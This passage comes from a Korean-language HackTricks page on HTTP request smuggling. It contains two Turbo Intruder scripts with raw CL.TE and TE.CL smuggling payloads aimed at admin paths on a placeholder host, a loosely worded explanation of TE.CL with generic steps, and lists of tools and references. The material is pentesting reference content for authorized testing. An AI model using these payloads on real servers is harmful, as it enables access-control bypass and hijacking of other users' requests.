engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

From: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)

TE.CL은 Transfer-Encoding 헤더 필드를 사용하여 HTTP 요청을 스머글링하는 기술입니다. 이 기술은 웹 서버와 프록시 서버 간의 통신에서 발생하는 HTTP 요청 분할 및 재조립의 취약점을 이용합니다. 이 취약점을 악용하면 공격자는 웹 애플리케이션에 대한 권한 상승, 세션 하이재킹, 정보 노출 등의 공격을 수행할 수 있습니다.

TE.CL 기술은 Content-Length 헤더 필드와 Transfer-Encoding 헤더 필드 간의 불일치를 이용합니다. 이를 통해 공격자는 웹 서버와 프록시 서버 간의 통신을 혼란시키고, 잘못된 요청을 전달하여 보안을 우회할 수 있습니다.

TE.CL 기술을 사용하여 HTTP 요청을 스머글링하려면 다음 단계를 따르면 됩니다:

1. Content-Length 헤더 필드를 설정하여 원하는 요청을 보냅니다.
2. Transfer-Encoding 헤더 필드를 설정하여 요청을 분할합니다.
3. 잘못된 요청을 전달하여 보안을 우회합니다.

이러한 공격은 웹 애플리케이션의 취약점을 이용하므로, 개발자와 시스템 관리자는 이러한 취약점을 방지하기 위해 적절한 보안 조치를 취해야 합니다.
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## 도구

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): 이 도구는 이상한 요청 스머글링 불일치를 찾는 데 유용한 문법 기반 HTTP Fuzzer입니다.

## 참고 자료

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 자신의 해킹 기법을 공유하세요.

</details>
